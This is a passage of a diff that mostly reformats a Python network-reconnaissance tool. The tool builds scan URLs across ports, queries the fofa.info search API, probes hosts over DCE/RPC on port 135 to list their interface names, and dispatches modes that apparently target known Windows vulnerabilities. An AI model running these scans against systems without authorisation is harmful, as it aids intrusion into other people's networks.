-                        bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                        bak_temp_url = (
+                            "http://"
+                            + host
+                            + ":"
+                            + str(i)
+                            + "/"
+                            + str(urlpath).lstrip("/")
+                        )
                         getattr(this_module, mf)(bak_temp_url)
 
                         if i == "443":
 
-                            bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://" + host + "/" + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                         else:
-                            bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                     elif "//" not in url and ":" in url and "/" in url:
 
@@ -8687,27 +9729,59 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                             for o in url.split("/")[1:]:
                                 urlpath += "/" + o
                         else:
-                            host, port, urlpath = url.split(":")[0], url.split(":")[1].split("/")[0], \
-                                                  url.split(":")[1].split("/")[1]
-                        bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            host, port, urlpath = (
+                                url.split(":")[0],
+                                url.split(":")[1].split("/")[0],
+                                url.split(":")[1].split("/")[1],
+                            )
+                        bak_temp_url = (
+                            "http://"
+                            + host
+                            + ":"
+                            + str(i)
+                            + "/"
+                            + str(urlpath).lstrip("/")
+                        )
                         getattr(this_module, mf)(bak_temp_url)
                         if tag:
                             # default with port to Do not repeat the loop with the built-in port
 
-                            bak_temp_url = "http://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + port
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
 
-
-                            bak_temp_url = "https://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + host
+                                + ":"
+                                + port
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             tag = False
                         if i == "443":
 
-                            bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://" + host + "/" + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                         else:
 
-                            bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                     elif "//" in url and len(url.split(":")) > 2 and "/" in url:
 
@@ -8721,29 +9795,60 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                             for o in url.split("/")[1:]:
                                 urlpath += "/" + o
                         else:
-                            host, port, urlpath = url.split(":")[0], url.split(":")[1].split("/")[0], \
-                                                  url.split(":")[1].split("/")[1]
+                            host, port, urlpath = (
+                                url.split(":")[0],
+                                url.split(":")[1].split("/")[0],
+                                url.split(":")[1].split("/")[1],
+                            )
 
-
-                        bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                        bak_temp_url = (
+                            "http://"
+                            + host
+                            + ":"
+                            + str(i)
+                            + "/"
+                            + str(urlpath).lstrip("/")
+                        )
                         getattr(this_module, mf)(bak_temp_url)
                         if tag:
                             # default with port to Do not repeat the loop with the built-in port
 
-                            bak_temp_url = "http://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + port
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
 
-
-                            bak_temp_url = "https://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + host
+                                + ":"
+                                + port
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             tag = False
                         if i == "443":
 
-                            bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://" + host + "/" + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                         else:
 
-                            bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                     elif "//" in url and len(url.split(":")) == 2 and "/" in url:
                         url = url.replace("http://", "").replace("https://", "")
@@ -8760,16 +9865,31 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                             host, urlpath = url.split("/")[0], url.split("/")[1]
                         urlpath = urlpath.strip()
 
-
-                        bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                        bak_temp_url = (
+                            "http://"
+                            + host
+                            + ":"
+                            + str(i)
+                            + "/"
+                            + str(urlpath).lstrip("/")
+                        )
                         getattr(this_module, mf)(bak_temp_url)
                         if i == "443":
 
-                            bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://" + host + "/" + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                         else:
 
-                            bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                     else:
                         # http://www.example.com
@@ -8801,16 +9921,27 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                     for upath in urlpath:
                         if "443" in url and ":" in url:
 
-                            bak_temp_url = "http://" + url + "/" + str(upath).lstrip("/")
+                            bak_temp_url = (
+                                "http://" + url + "/" + str(upath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
 
-                            bak_temp_url = "https://" + url.split(":")[0] + "/" + str(upath).lstrip("/")
+                            bak_temp_url = (
+                                "https://"
+                                + url.split(":")[0]
+                                + "/"
+                                + str(upath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                         else:
-                            bak_temp_url = "http://" + url + "/" + str(upath).lstrip("/")
+                            bak_temp_url = (
+                                "http://" + url + "/" + str(upath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
 
-                            bak_temp_url = "https://" + url + "/" + str(upath).lstrip("/")
+                            bak_temp_url = (
+                                "https://" + url + "/" + str(upath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
         else:
             # normal mode
@@ -8825,36 +9956,75 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                     for upath in urlpath:
                         if "/" not in url and "//" not in url and ":" not in url:
                             # www.example.com
-                            bak_temp_url = "http://" + url + ":" + str(i) + "/" + str(upath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + url
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(upath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             if i == "443":
 
-                                bak_temp_url = "https://" + url + "/" + str(upath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://" + url + "/" + str(upath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                             else:
 
-                                bak_temp_url = "https://" + url + ":" + str(i) + "/" + str(upath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + url
+                                    + ":"
+                                    + str(i)
+                                    + "/"
+                                    + str(upath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                         elif "/" not in url and "//" not in url and ":" in url:
                             # if www.example.com:8080
 
                             host, port = url.split(":")[0], url.split(":")[1]
 
-                            bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(upath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(upath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             if tag:
                                 # default with port to Do not repeat the loop with the built-in port
 
-                                bak_temp_url = "http://" + host + ":" + port + "/" + str(upath).lstrip("/")
+                                bak_temp_url = (
+                                    "http://"
+                                    + host
+                                    + ":"
+                                    + port
+                                    + "/"
+                                    + str(upath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                                 tag = False
                             if i == "443":
 
-                                bak_temp_url = "https://" + host + "/" + str(upath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://" + host + "/" + str(upath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
 
                             else:
-                                bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(upath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + str(i)
+                                    + "/"
+                                    + str(upath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
 
                         elif "//" not in url and ":" not in url and "/" in url:
@@ -8869,14 +10039,30 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                                     urlpath += "/" + o
                             else:
                                 host, urlpath = url.split("/")[0], url.split("/")[1]
-                            bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
 
                             if i == "443":
-                                bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://" + host + "/" + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                             else:
-                                bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + str(i)
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                         elif "//" not in url and ":" in url and "/" in url:
                             # www.example.com:8080/login
@@ -8889,29 +10075,61 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                                 for o in url.split("/")[1:]:
                                     urlpath += "/" + o
                             else:
-                                host, port, urlpath = url.split(":")[0], url.split(":")[1].split("/")[0], \
-                                                      url.split(":")[1].split("/")[1]
+                                host, port, urlpath = (
+                                    url.split(":")[0],
+                                    url.split(":")[1].split("/")[0],
+                                    url.split(":")[1].split("/")[1],
+                                )
 
-                            bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             if tag:
                                 # default with port to Do not repeat the loop with the built-in port
 
-                                bak_temp_url = "http://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "http://"
+                                    + host
+                                    + ":"
+                                    + port
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
 
-
-                                bak_temp_url = "https://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + port
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
 
                                 tag = False
                             if i == "443":
 
-                                bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://" + host + "/" + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                             else:
 
-                                bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + str(i)
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                         elif "//" in url and len(url.split(":")) > 2 and "/" in url:
 
@@ -8925,26 +10143,58 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                                 for o in url.split("/")[1:]:
                                     urlpath += "/" + o
                             else:
-                                host, port, urlpath = url.split(":")[0], url.split(":")[1].split("/")[0], \
-                                                      url.split(":")[1].split("/")[1]
+                                host, port, urlpath = (
+                                    url.split(":")[0],
+                                    url.split(":")[1].split("/")[0],
+                                    url.split(":")[1].split("/")[1],
+                                )
 
-
-                            bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             if tag:
                                 # default with port to Do not repeat the loop with the built-in port
 
-                                bak_temp_url = "http://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "http://"
+                                    + host
+                                    + ":"
+                                    + port
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
 
-                                bak_temp_url = "https://" + host + ":" + port + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + port
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                                 tag = False
                             if i == "443":
-                                bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://" + host + "/" + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                             else:
-                                bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + str(i)
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                         elif "//" in url and len(url.split(":")) == 2 and "/" in url:
                             url = url.replace("http://", "").replace("https://", "")
@@ -8961,19 +10211,34 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                                 host, urlpath = url.split("/")[0], url.split("/")[1]
                             urlpath = urlpath.strip()
 
-                            bak_temp_url = "http://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                            bak_temp_url = (
+                                "http://"
+                                + host
+                                + ":"
+                                + str(i)
+                                + "/"
+                                + str(urlpath).lstrip("/")
+                            )
                             getattr(this_module, mf)(bak_temp_url)
                             if i == "443":
-                                bak_temp_url = "https://" + host + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://" + host + "/" + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                             else:
-                                bak_temp_url = "https://" + host + ":" + str(i) + "/" + str(urlpath).lstrip("/")
+                                bak_temp_url = (
+                                    "https://"
+                                    + host
+                                    + ":"
+                                    + str(i)
+                                    + "/"
+                                    + str(urlpath).lstrip("/")
+                                )
                                 getattr(this_module, mf)(bak_temp_url)
                         else:
                             # http://www.example.com
 
                             url = url.replace("http://", "").replace("https://", "")
-
 
                             bak_temp_url = "http://" + url + ":" + str(i)
                             getattr(this_module, mf)(bak_temp_url)
@@ -8991,13 +10256,21 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                                     getattr(this_module, mf)(bak_temp_url)
 
 
-
 # ==============================
 
-def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfile="res_alivedomain.txt", urlpath=None):
+
+def aliveThreadControl(
+    hr,
+    task_list,
+    method,
+    listport=[],
+    threadnum=200,
+    outfile="res_alivedomain.txt",
+    urlpath=None,
+):
     global progress, progress_num, locks, ca_certs, urllib2
 
-    # write file of cacert.pem 
+    # write file of cacert.pem
     try:
         if not args.nocert:
             if PYVERSION > "3.0":
@@ -9042,7 +10315,7 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
     elif method == "oxid":
         for url in gen_ip(hr):
             progress_num += 1
-            putdata = (url)
+            putdata = url
             queue.put(putdata)
     elif method == "fscan" or method == "sfscan":
         # Use tscan to get title from result of fofa scan
@@ -9051,18 +10324,21 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
         if platform.system() == "Windows" and PYVERSION < "3.0":
             urlpath = urlpath.decode("gbk")
             urlpath = urlpath.encode("utf-8")
-        urlpath = urlpath.replace("'", "\"")
+        urlpath = urlpath.replace("'", '"')
 
         # Adapter for python3
         try:
-            domains = urlpath.encode("base64").replace("\r","").replace("\n","")
+            domains = urlpath.encode("base64").replace("\r", "").replace("\n", "")
         except LookupError:
             domains = base64.b64encode(urlpath.encode("utf-8")).decode("utf-8")
-            domains = domains.replace("\r","").replace("\n","")
+            domains = domains.replace("\r", "").replace("\n", "")
 
-        email,token = Account().Fofakey()
+        email, token = Account().Fofakey()
         # get top of 10000 results
-        api_request = "https://fofa.info/api/v1/search/all?email=%s&size=%d&key=%s&qbase64=%s" % (email, fofa_size, token, domains)
+        api_request = (
+            "https://fofa.info/api/v1/search/all?email=%s&size=%d&key=%s&qbase64=%s"
+            % (email, fofa_size, token, domains)
+        )
 
         print(info("Waiting for fofa ..."))
         try:
@@ -9081,7 +10357,7 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
             else:
                 total = fofa_result["size"]
                 total = int(total)
-                # judge wether size of result of the fofa scan is more than 200 
+                # judge wether size of result of the fofa scan is more than 200
                 if fofa_result["results"] == []:
                     print(bingo("There no result!"))
                 else:
@@ -9090,11 +10366,14 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
                         pages_total += 1
                     else:
                         pages_total = 1
-                    for page in range(1,pages_total + 1):
-                        if page > 1 :
+                    for page in range(1, pages_total + 1):
+                        if page > 1:
                             if 1:
                                 break
-                            api_request = "https://fofa.info/api/v1/search/all?email=%s&key=%s&page=%s&size=%d&qbase64=%s" % (email, token, page, fofa_size, domains)
+                            api_request = (
+                                "https://fofa.info/api/v1/search/all?email=%s&key=%s&page=%s&size=%d&qbase64=%s"
+                                % (email, token, page, fofa_size, domains)
+                            )
                             json_result = urllib2.urlopen(api_request, timeout=20)
                             result = json_result.read()
                             fofa_result = json.loads(result)
@@ -9106,13 +10385,29 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
                             locks.acquire(1)
                             for mclists in fofa_result["results"]:
                                 fdomain = mclists[0]
-                                fhost   = mclists[1]
-                                fport   = mclists[2]
-                                print(info("[ ") + PASSAT(fdomain) + " | " + fhost + " | " + Huskie(fport) + info(" ]"))
+                                fhost = mclists[1]
+                                fport = mclists[2]
+                                print(
+                                    info("[ ")
+                                    + PASSAT(fdomain)
+                                    + " | "
+                                    + fhost
+                                    + " | "
+                                    + Huskie(fport)
+                                    + info(" ]")
+                                )
                                 if platform.system() == "Windows":
                                     try:
                                         f = open("fofa_result.txt", "a+")
-                                        fofainfo = "[ " + fdomain + " | " + fhost + " | " + fport + " ]"
+                                        fofainfo = (
+                                            "[ "
+                                            + fdomain
+                                            + " | "
+                                            + fhost
+                                            + " | "
+                                            + fport
+                                            + " ]"
+                                        )
                                         f.write(fofainfo)
                                         f.write("\n")
                                         f.flush()
@@ -9121,44 +10416,81 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
                                         pass
 
                                 # filter http and https
-                                fdomain = fdomain.replace("http://","").replace("https://","")
+                                fdomain = fdomain.replace("http://", "").replace(
+                                    "https://", ""
+                                )
                                 fdomain = fdomain.split(":")[0]
                                 if args.u:
                                     for path in args.u:
                                         if listPort[0] == "":
-                                            queue.put("http://"  + fdomain + ":" + fport + path)
+                                            queue.put(
+                                                "http://" + fdomain + ":" + fport + path
+                                            )
                                             if fport == "443":
                                                 queue.put("https://" + fdomain + path)
                                             else:
-                                                queue.put("https://" + fdomain + ":" + fport+path)
+                                                queue.put(
+                                                    "https://"
+                                                    + fdomain
+                                                    + ":"
+                                                    + fport
+                                                    + path
+                                                )
                                             progress_num += 2
-                                        else :
+                                        else:
                                             for port in listPort:
                                                 if port == "443":
-                                                    queue.put("https://" + fdomain + path)
-                                                    queue.put("http://" + fdomain + ":" + port + path)
+                                                    queue.put(
+                                                        "https://" + fdomain + path
+                                                    )
+                                                    queue.put(
+                                                        "http://"
+                                                        + fdomain
+                                                        + ":"
+                                                        + port
+                                                        + path
+                                                    )
                                                 else:
-                                                    queue.put("http://" + fdomain + ":" + port + path)
-                                                    queue.put("https://" + fdomain + ":" + port + path)
+                                                    queue.put(
+                                                        "http://"
+                                                        + fdomain
+                                                        + ":"
+                                                        + port
+                                                        + path
+                                                    )
+                                                    queue.put(
+                                                        "https://"
+                                                        + fdomain
+                                                        + ":"
+                                                        + port
+                                                        + path
+                                                    )
                                                 progress_num += 2
                                 else:
                                     if listPort[0] == "":
-                                        queue.put("http://"  + fdomain + ":" + fport)
+                                        queue.put("http://" + fdomain + ":" + fport)
                                         if fport == "443":
                                             queue.put("https://" + fdomain)
                                         else:
-                                            queue.put("https://" + fdomain + ":"+fport )
+                                            queue.put(
+                                                "https://" + fdomain + ":" + fport
+                                            )
                                         progress_num += 2
-                                    else :
+                                    else:
                                         for port in listPort:
                                             if port == "443":
                                                 queue.put("https://" + fdomain)
-                                                queue.put("http://" + fdomain + ":" + port)
+                                                queue.put(
+                                                    "http://" + fdomain + ":" + port
+                                                )
                                             else:
-                                                queue.put("http://" + fdomain + ":" + port)
-                                                queue.put("https://" + fdomain + ":" + port)
+                                                queue.put(
+                                                    "http://" + fdomain + ":" + port
+                                                )
+                                                queue.put(
+                                                    "https://" + fdomain + ":" + port
+                                                )
                                             progress_num += 2
-
 
                             if platform.system() == "Windows":
                                 try:
@@ -9179,27 +10511,26 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
             print("\n")
 
         except Exception as e:
-            # print e
             print(bingo("-") + " " + repr(e))
             pass
 
         if method == "fscan":
             method = "tscan"
             hr = [hr]
-        else: 
+        else:
             method = "subscan"
             urlpath = None
 
-    if (method == "tscan" or method == "cdnscan" or
-        method == "shscan"):
-        Encapsulation_before_tscan("tscan_core", hr, task_list, method, listport, threadnum, outfile, urlpath)
+    if method == "tscan" or method == "cdnscan" or method == "shscan":
+        Encapsulation_before_tscan(
+            "tscan_core", hr, task_list, method, listport, threadnum, outfile, urlpath
+        )
         # Build fingprint to identification
     elif method == "17scan" or method == "gtscan":
         for ip in gen_ip(hr):
             progress_num += 1
             queue.put(ip)
-    elif (method == "0708scan" or method == "nbscan" or
-        method == "dpscan"):
+    elif method == "0708scan" or method == "nbscan" or method == "dpscan":
         for i in listport:
             for ip in gen_ip(hr):
                 progress_num += 1
@@ -9210,7 +10541,7 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
         # fix for domain which has "-"
         if type(hr) == str:
             hr = [hr]
-        
+
         sum_sub_result = []
         for sdomain in hr[0].split(","):
             subs = subscanProcess(sdomain)
@@ -9220,7 +10551,11 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
             try:
                 pdns_results = subs.passivetotal_get("/v2/enrichment/subdomains")
                 pdns_results = json.loads(pdns_results)
-                pasving = info("PASSIVE Request ") + str(len(pdns_results["subdomains"])) +  " |"
+                pasving = (
+                    info("PASSIVE Request ")
+                    + str(len(pdns_results["subdomains"]))
+                    + " |"
+                )
                 sys.stdout.write(pasving)
                 sys.stdout.flush()
             except Exception as e:
@@ -9241,19 +10576,30 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
             # you should input ["www","a","b"]
             # duplicate remove for domain
 
-            sub_result = duprm(pdns_results["subdomains"], cert_results, vts_results, bing_results)
-
+            sub_result = duprm(
+                pdns_results["subdomains"], cert_results, vts_results, bing_results
+            )
 
             # add host name to sub_result
             for k, i in enumerate(sub_result):
-                sub_result[k]= i + "." + sdomain
+                sub_result[k] = i + "." + sdomain
             sum_sub_result += sub_result
 
-        Encapsulation_before_tscan("subscan_core", sum_sub_result, task_list, method, listport, threadnum, outfile, urlpath)
-            
-    
+        Encapsulation_before_tscan(
+            "subscan_core",
+            sum_sub_result,
+            task_list,
+            method,
+            listport,
+            threadnum,
+            outfile,
+            urlpath,
+        )
+
     elif method == "bakscan":
-        Encapsulation_before_tscan("bakscan_core", hr, task_list, method, listport, threadnum, outfile, urlpath)
+        Encapsulation_before_tscan(
+            "bakscan_core", hr, task_list, method, listport, threadnum, outfile, urlpath
+        )
 
     progress = ProgressBar(progress_num, fmt=ProgressBar.FULL)
     progress.current = scaned
@@ -9270,12 +10616,13 @@ def aliveThreadControl(hr, task_list, method, listport=[], threadnum=200, outfil
     except:
         pass
 
+
 # --------- OXID FUNC ------------
 def get_addres(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.settimeout(2)
-        sock.connect((ip,135))
+        sock.connect((ip, 135))
         buffer_v1 = b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xc4\xfe\xfc\x99\x60\x52\x1b\x10\xbb\xcb\x00\xaa\x00\x21\x34\x7a\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00"
         buffer_v2 = b"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00"
         sock.send(buffer_v1)
@@ -9286,11 +10633,11 @@ def get_addres(ip):
         packet_v2_end = packet_v2.find(b"\x09\x00\xff\xff\x00\x00")
         packet_v2 = packet_v2[:packet_v2_end]
         hostname_list = packet_v2.split(b"\x00\x00")
-        result = {ip:[]}
+        result = {ip: []}
         print("[*] " + ip)
         for h in hostname_list:
-            h = h.replace(b"\x07\x00",b"")
-            h = h.replace(b"\x00",b"")
+            h = h.replace(b"\x07\x00", b"")
+            h = h.replace(b"\x00", b"")
             if h == b"":
                 continue
             print("\t[->]" + str(h))
@@ -9298,17 +10645,17 @@ def get_addres(ip):
         print(result)
         return result
     except Exception as e:
-        #traceback.print_exc()
+        # traceback.print_exc()
         return -1
     finally:
         sock.close()
+
 
 # --------- add header ------------
 def addHeader(addheaders):
     global headers
     header_key, header_value = addheaders.split(":")
     headers[header_key] = header_value
-
 
 
 # --------- Main scope ------------
@@ -9320,17 +10667,31 @@ def AG3(args_v, method, listPort, threadnum, action, outfile, urlpath, **kwargs)
             if method == "ddscan":
                 hr = opensubDomainFile(args_v)
                 method = "tscan"
-                aliveThreadControl(hr, task_list, method, listPort, threadnum, outfile, urlpath)
+                aliveThreadControl(
+                    hr, task_list, method, listPort, threadnum, outfile, urlpath
+                )
             elif method == "hostscan":
                 hr = opensubFile(args_v)
                 method = "tscan"
-                aliveThreadControl(hr, task_list, method, listPort, threadnum, outfile, urlpath)
+                aliveThreadControl(
+                    hr, task_list, method, listPort, threadnum, outfile, urlpath
+                )
+            elif method == "vhostscan":
+                hr = openFile(args_v)
+                method = "tscan"
+                aliveThreadControl(
+                    hr, task_list, method, listPort, threadnum, outfile, urlpath
+                )
             else:
                 hr = openFile(args_v)
-                aliveThreadControl(hr, task_list, method, listPort, threadnum, outfile, urlpath)
+                aliveThreadControl(
+                    hr, task_list, method, listPort, threadnum, outfile, urlpath
+                )
         elif action == "list":
-            aliveThreadControl(args_v, task_list, method, listPort, threadnum, outfile, urlpath)
-        
+            aliveThreadControl(
+                args_v, task_list, method, listPort, threadnum, outfile, urlpath
+            )
+
         # nothread
 
         if method == "icmpt":
@@ -9343,32 +10704,33 @@ def AG3(args_v, method, listPort, threadnum, action, outfile, urlpath, **kwargs)
                 connectport = kwargs["icconport"]
                 _StartConnect(serverip, 1, connectip, int(connectport))
             else:
-               _StartServer("0.0.0.0", 0)
+                _StartServer("0.0.0.0", 0)
     except TypeError as e:
         print(traceback.print_exc())
+
 
 # --------- Main scope ------------
 
 
 def parse_range_int(range_string):
-    listPort=[]
+    listPort = []
     if "-" in range_string and "," in range_string:
-       """
-       -p --hidden-size dongtai fanwei 
-       """
-       tmpportlist = range_string.split(",")
-       for i in tmpportlist:
-           if "-" in i:
-               startp, endp = i.split("-")
-               tmpportlist2 = range(int(startp), int(endp) + 1)
-           else:
-               listPort.append(i)
-       listPort+=tmpportlist2
+        """
+        -p --hidden-size dongtai fanwei
+        """
+        tmpportlist = range_string.split(",")
+        for i in tmpportlist:
+            if "-" in i:
+                startp, endp = i.split("-")
+                tmpportlist2 = range(int(startp), int(endp) + 1)
+            else:
+                listPort.append(i)
+        listPort += tmpportlist2
     elif "-" in range_string:
-       startp, endp = range_string.split("-")
-       listPort = range(int(startp), int(endp)+1)
+        startp, endp = range_string.split("-")
+        listPort = range(int(startp), int(endp) + 1)
     else:
-       listPort = range_string.split(",")
+        listPort = range_string.split(",")
     return listPort
 
 
@@ -9380,85 +10742,172 @@ def pring_logo():
     /   \     |  |     |  |     |  | |  \ |  | 
    /  ^  \    |  |     |  |     |  | |   \|  | 
